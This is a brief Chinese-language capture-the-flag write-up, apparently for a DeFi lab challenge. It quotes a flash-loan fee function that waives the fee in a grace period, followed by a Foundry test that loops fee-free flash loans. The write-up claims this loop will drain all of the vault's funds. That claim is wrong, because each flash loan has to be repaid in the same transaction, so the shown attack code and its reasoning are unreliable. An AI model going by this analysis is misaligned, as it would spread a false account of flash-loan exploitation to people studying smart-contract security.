```
if (block.timestamp < end && _amount < maxFlashLoan(_token)) { 
            return 0; // 手續費為 0
        } else {
            return _amount.mulWadUp(FEE_FACTOR); 
        }
```
在寬限期內並且借款金額小於最大可借金額是可以不用手續費的，所以理論上可以一直借
所以根據這個想法可以寫出以下
```
function test_unstoppable() public {
        // Remove vm.startPrank here since it's already in the modifier
        
        // 設置每次借貸的金額（可選擇小於總金額的適當值）
        uint256 amountToBorrow = 100e18;

        // 總共要借出多少次以取出所有金庫資金
        uint256 numLoans = TOKENS_IN_VAULT / amountToBorrow;

        // 進行多次閃電貸，逐步取出金庫中的資金
        for (uint256 i = 0; i < numLoans; i++) {
            // 每次借貸都應該確保是有效的
            try vault.flashLoan(
                monitorContract, // 使用 monitorContract 作為閃電貸接收者
                address(token),
                amountToBorrow,
                ""
            ) {
                // 如果成功，繼續進行下一步
            } catch {
                // 處理錯誤，例如金庫可能已經被暫停
                break;
            }
        }

        // Remove vm.stopPrank here since it's handled by the modifier
    }

```
